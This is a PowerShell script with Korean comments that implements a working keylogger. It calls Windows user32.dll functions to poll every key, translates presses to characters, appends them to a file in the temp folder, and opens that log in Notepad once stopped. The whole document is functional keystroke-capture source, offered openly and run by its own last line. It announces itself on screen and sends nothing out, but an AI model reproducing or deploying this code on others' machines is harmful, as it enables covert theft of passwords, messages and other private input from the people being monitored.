# 버전 2 요구
function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
{
  # API 호출에 대한 서명
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  # 서명을 로드하고 회원이 사용할 수 있도록 설정
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
  # 결과 파일 생성
  $null = New-Item -Path $Path -ItemType File -Force

  try
  {
    Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red

    # CTRL + C 를 누를 때까지 무한 루프 생성
    # 마지막으로 블록 실행하고 수집된 키 입력을 보여줌
    while ($true) {
      Start-Sleep -Milliseconds 40
      
      # 8 이상의 ASCII 코드 스캔
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # 현재 키 상태를 가져옴
        $state = $API::GetAsyncKeyState($ascii)

        # 키를 누를 시
        if ($state -eq -32767) {
          $null = [console]::CapsLock

          # 실제 코드에 스캔 코드를 번역
          $virtualKey = $API::MapVirtualKey($ascii, 3)

          # 가상 키의 키보드 상태를 가져옴
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          # 입력 키를 수신하여 StringBuilder 준비
          $mychar = New-Object -TypeName System.Text.StringBuilder

          # 가상 키를 번역
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

          if ($success) 
          {
            # 로그 파일에 키값를 추가함
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
          }
        }
      }
    }
  }
  finally
  {
    # 메모장으로 로그 파일 열기
    notepad $Path
  }
}

# 스크립트가 Ctrl+C 를 눌러 중단할 때까지 모든 키 입력을 기록
# 다음 수집된 키 코드로 파일을 열기
Start-KeyLogger
